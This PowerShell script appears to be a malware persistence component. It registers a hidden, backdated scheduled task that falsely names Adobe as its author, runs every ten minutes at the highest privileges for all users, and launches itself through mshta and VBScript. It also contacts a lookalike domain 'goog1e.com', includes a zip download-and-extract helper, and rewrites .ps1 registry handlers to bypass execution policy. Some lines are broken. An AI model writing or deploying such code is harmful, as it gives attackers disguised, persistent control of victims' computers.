#Requires -Version 5

$taskVersion = "1.0"
$uri = "https://goog1e.com"

$TasksDefinitions = @{
  "PwshWatcher"      = @{
    "Name"          = "PwshWatcher";
    "Values"        = @{
      "/ns:Task/ns:Actions/ns:Exec/ns:Command" = "mshta.exe";
      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''{ScriptFile}''"""""", 0 : window.close")'
    };
    "XmlDefinition" = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1971-08-31T00:00:00.0000000</Date>
    <Author>Adobe Systems Incorporated</Author>
    <Description>Adobe watcher</Description>
    <Version>' + $taskVersion + '</Version>
    <URI>\Adobe_Watcher</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>1971-08-31T00:00:00</StartBoundary>
      <ExecutionTimeLimit>PT30M</ExecutionTimeLimit>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-1-0</GroupId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command></Command>
      <Arguments></Arguments>
    </Exec>
  </Actions>
</Task>
"@
  }
}

######## Local functions

function _Unpack {
  param(
    [string]$DonwloadUri,
    [string]$DestinationFolder
  )

  $tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'zip' } -PassThru
  Invoke-WebRequest -OutFile $tmp $DonwloadUri
  Add-Type -Assembly System.IO.Compression.FileSystem
  $zip = [IO.Compression.ZipFile]::OpenRead($tmp.FullName)
  $entries = $zip.Entries | Where-Object { -not [string]::IsNullOrWhiteSpace($_.Name) -and -not $_.Name.EndsWith(".cmd") -and -not $_.Name.ToLower().Equals("sha256sums") }
  foreach ($entry in $entries) {
    $dpath = Join-Path -Path $DestinationFolder -ChildPath $entry.Name
    [IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $dpath, $true)
  }
}

function _PwshContextMenu {
  #$oldVarDefault = (Get-ItemProperty -path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command)."(Default)"
  #$oldVarDefautValue = '%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -Command "&''%1''"'

  $pwshVarMenu = "$((Get-Command pwsh).Path) -Command ""&'%1'"""

  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command -Type ExpandString -Name '(Default)' -Value $pwshVarMenu

  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Force
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe -Command "$host.UI.RawUI.WindowTitle = ''PowerShell 7 (x64)''; if((Get-ExecutionPolicy ) -ne ''AllSigned'') { Set-ExecutionPolicy -Scope Process Bypass }; & ''%1''"' 
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name "PowerShellPath" -Value $pwshPath -Type String

  #"C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList '-ExecutionPolicy RemoteSigned -File \"%1\"' -Verb RunAs;start-sleep 1}"
  $keyName = "Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Run with PowerShell 7 (Admin)"
  New-Item -Path $keyName -Force
  Set-ItemProperty -Path $keyName -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path $keyName "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path "$keyName\Command" -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList ''-ExecutionPolicy RemoteSigned -File \"%1\"'' -Verb RunAs;start-sleep 1}'
  Set-ItemProperty -Path "$keyName\Command" -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path "$keyName\Command" -Name "PowerShellPath" -Value $pwshPath -Type String
}

function _RegisterTask {
  param (
    [Parameter()]
    [string]$TaskName
  )
  
  $taskData = $TasksDefinitions[$TaskName];
  $xml = [xml]$taskData["XmlDefinition"]
  $ns = New-Object System.Xml.XmlNamespaceManager($xml.NameTable)
  $ns.AddNamespace("ns", $xml.DocumentElement.NamespaceURI)
  foreach ($item in $TasksDefinitions[$TaskName]["Values"].Keys) {
    $xmlNode = $xml.SelectSingleNode($item, $ns);
    if ($xmlNode) {
      $innerText = $TasksDefinitions[$TaskName]["Values"][$item] -replace '{RootFolder}', $destinationFolder -replace '{ScriptFile}', $scriptFile
      $xmlNode.InnerText = $innerText
    }
  }
  $taskData["XmlDefinition"] = $xml.OuterXml;
  #try {
    Register-Task -TaskData $taskData -Force
  #}
  #catch {}
}

function _CheckTask {
  param (
    [Parameter(Mandatory = $true)]
    [string]$TaskName,
    [Parameter()]
    [switch]$Register = $false
  )

  $scheduledTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
  $needRegister = $false

  if (-not $scheduledTask) {
    $needRegister = $true
  }
  else {
    $taskVersionCurrent = $scheduledTask.Version
    if ((Get-ScheduledTask -TaskName $TaskName).State -eq "Disabled" -or ($taskVersionCurrent -ne $taskVersion)) {
      Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
      $needRegister = $true
    }
  }
  if ($needRegister -and $Register) {
    _RegisterTask -TaskName $TaskName;
    $needRegister = !$needRegister;
  }
  return !$needRegister
}

function _CheckServerConnection
{
  try{
    Invoke-RestMethod -Uri "$uri/GetConfig";
    return $true;
  }
  catch
  {
    return $false;
  }
}

function Import-Command
{
  [CmdletBinding()]
  param (
      [Parameter()]
      [string]
      [ValidateSet("Get-IsAdmin", "Register-Task", "Install-Powershell")]
      $CommandName
  )
  [hashtable]$commands = @{
    "Get-IsAdmin" = "$PSScriptRoot\..\..\..\Modules\Agt.Common\Public\Get-IsAdmin.ps1"
    "Register-Task" = "$PSScriptRoot\..\..\..\Modules\Agt.Common\Public\Register-Task.ps1"
    "Install-Powershell" = "$PSScriptRoot\..\..\..\Modules\Agt.Install\Public\Install-Powershell.ps1"
  }
  if(!(Get-Command -Name $ -ErrorAction SilentlyContinue)){
    $path = (Resolve-Path $commands[$CommandName]);
    Import-Module "$($path.Path)"
  }
}

try{
  Import-Command -CommandName "Get-IsAdmin"
  Import-Command -CommandName "Register-Task"
  Import-Command -CommandName "Install-Powershell"
}
catch {
  Write-Output "Not all modules imopted."
}

########  Variables

$TaskName = "PwshWatcher"
$destinationFolder = $PSScriptRoot
$thisFileName = $MyInvocation.MyCommand.Name
#$thisFileFullName = $MyInvocation.MyCommand.Path
$scriptFile = [System.IO.Path]::Combine($PSScriptRoot, $thisFileName)
$debugger = $false; #($PSBoundParameters.ContainsKey("Debug")) -or ($DebugPreference  -eq "SilentlyContinue")

######## Check task

if(-not $debugger)
{
  $taskExist = _CheckTask -TaskName $TaskName -Register;
  if (!$taskExist) {
    exit
  }
}

Install-Powershell
